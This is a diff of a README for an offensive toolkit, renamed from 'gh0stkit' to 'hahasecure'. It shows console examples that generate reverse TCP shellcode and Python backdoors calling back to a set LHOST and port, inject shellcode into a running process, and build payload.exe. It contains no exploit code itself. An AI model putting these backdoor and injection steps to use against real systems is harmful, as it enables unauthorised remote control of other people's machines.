@@ -1,11 +1,11 @@
-# gh0stkit - A Multi-Purpose Exploitation Toolkit
+# hahasecure - A Multi-Purpose Exploitation Toolkit
 
-![gh0stkit](https://i.pinimg.com/736x/90/44/f3/9044f3f6d0aba2ebb7196b4141b4fa70.jpg)
-
-
+![hahasecure](https://i.pinimg.com/736x/90/44/f3/9044f3f6d0aba2ebb7196b4141b4fa70.jpg)
 
 
-#### *gh0stkit is a versatile exploitation toolkit designed for penetration testers, security researchers, and red teamers. It provides a wide range of features, including shellcode generation, backdoor creation, process injection, encoding, and executable generation for multiple platforms.*
+
+
+#### *hahasecure is a versatile exploitation toolkit designed for penetration testers, security researchers, and red teamers. It provides a wide range of features, including shellcode generation, backdoor creation, process injection, encoding, and executable generation for multiple platforms.*
 ### **Author:**
 [Livepwn](https://github.com/livepwn)
 ## Features
@@ -37,14 +37,14 @@
 ### Clone the repository:
 
 ```
-git clone https://github.com/livepwn/gh0stkit.git
+git clone https://github.com/livepwn/hahasecure.git
 
-cd gh0stkit
+cd hahasecure
   ```
 ### Run the tool:
 
 ```
-python gh0stkit.py 
+python hahasecure.py 
 
 Alert: Donot run this tool with sudo or chmod.
 ```
@@ -53,7 +53,7 @@ Alert: Donot run this tool with sudo or chmod.
 - When you run the tool, you'll see the main menu:
 
 ```
-gh0stkit > 
+hahasecure > 
 Available commands:
 
 help: Show the help menu.
@@ -83,11 +83,11 @@ exit: Exit the tool.
 #### **Example:**
 
 ```
-gh0stkit > use shellcode
-gh0stkit/shellcode > set LHOST 192.168.1.100
-gh0stkit/shellcode > set LPORT 4444
-gh0stkit/shellcode > set PLATFORM linux/x64
-gh0stkit/shellcode > generate
+hahasecure > use shellcode
+hahasecure/shellcode > set LHOST 192.168.1.100
+hahasecure/shellcode > set LPORT 4444
+hahasecure/shellcode > set PLATFORM linux/x64
+hahasecure/shellcode > generate
 ```
 2. Backdoor Module
 - Create Python-based backdoors.
@@ -102,11 +102,11 @@ gh0stkit/shellcode > generate
 
 #### **Example:**
 ```
-gh0stkit > use backdoor
-gh0stkit/backdoor > set LHOST 192.168.1.100
-gh0stkit/backdoor > set LPORT 4444
-gh0stkit/backdoor > set PLATFORM python/windows
-gh0stkit/backdoor > generate
+hahasecure > use backdoor
+hahasecure/backdoor > set LHOST 192.168.1.100
+hahasecure/backdoor > set LPORT 4444
+hahasecure/backdoor > set PLATFORM python/windows
+hahasecure/backdoor > generate
 ```
 3. Injector Module
 - Inject shellcode into a running process (Windows only).
@@ -117,8 +117,8 @@ gh0stkit/backdoor > generate
 
 #### **Example:**
 ```
-gh0stkit > use injector
-gh0stkit/injector > inject 1234
+hahasecure > use injector
+hahasecure/injector > inject 1234
 ```
 4. Encoder Module
 - Encode data using XOR, Base64, AES, or ROT13.
@@ -134,10 +134,10 @@ gh0stkit/injector > inject 1234
 #### **Example:**
 
 ```
-gh0stkit > use encoder
-gh0stkit/encoder > set ENCODING xor
-gh0stkit/encoder > set KEY secret
-gh0stkit/encoder > encode HelloWorld
+hahasecure > use encoder
+hahasecure/encoder > set ENCODING xor
+hahasecure/encoder > set KEY secret
+hahasecure/encoder > encode HelloWorld
 ```
 5. Executable Module
 - Compile shellcode into executables for Windows and Linux.
@@ -153,46 +153,46 @@ gh0stkit/encoder > encode HelloWorld
 #### **Example:**
 
 ```
-gh0stkit > use executable
-gh0stkit/executable > set PLATFORM windows
-gh0stkit/executable > set OUTPUT payload.exe
-gh0stkit/executable > generate
+hahasecure > use executable
+hahasecure/executable > set PLATFORM windows
+hahasecure/executable > set OUTPUT payload.exe
+hahasecure/executable > generate
 ```
 #### **Examples:**
 - Generate a Linux Reverse TCP Shellcode
 ```
-gh0stkit > use shellcode
-gh0stkit/shellcode > set LHOST 192.168.1.100
-gh0stkit/shellcode > set LPORT 4444
-gh0stkit/shellcode > set PLATFORM linux/x64
-gh0stkit/shellcode > generate
+hahasecure > use shellcode
+hahasecure/shellcode > set LHOST 192.168.1.100
+hahasecure/shellcode > set LPORT 4444
+hahasecure/shellcode > set PLATFORM linux/x64
+hahasecure/shellcode > generate
 ```
 - Create a Python Backdoor for Windows
 ```
-gh0stkit > use backdoor
-gh0stkit/backdoor > set LHOST 192.168.1.100
-gh0stkit/backdoor > set LPORT 4444
-gh0stkit/backdoor > set PLATFORM python/windows
-gh0stkit/backdoor > generate
+hahasecure > use backdoor
+hahasecure/backdoor > set LHOST 192.168.1.100
+hahasecure/backdoor > set LPORT 4444
+hahasecure/backdoor > set PLATFORM python/windows
+hahasecure/backdoor > generate
 ```
 - Inject Shellcode into a Process
 ```
-gh0stkit > use injector
-gh0stkit/injector > inject 1234
+hahasecure > use injector
+hahasecure/injector > inject 1234
 ```
 - Encode Data with XOR
 ```
-gh0stkit > use encoder
-gh0stkit/encoder > set ENCODING xor
-gh0stkit/encoder > set KEY secret
-gh0stkit/encoder > encode HelloWorld
+hahasecure > use encoder
+hahasecure/encoder > set ENCODING xor
+hahasecure/encoder > set KEY secret
+hahasecure/encoder > encode HelloWorld
 ```
 - Generate a Windows Executable
 ```
-gh0stkit > use executable
-gh0stkit/executable > set PLATFORM windows
-gh0stkit/executable > set OUTPUT payload.exe
-gh0stkit/executable > generate
+hahasecure > use executable
+hahasecure/executable > set PLATFORM windows
+hahasecure/executable > set OUTPUT payload.exe
+hahasecure/executable > generate
 ```
 ### Contributing
 Contributions are welcome! Please open an issue or submit a pull request for any improvements or bug fixes.
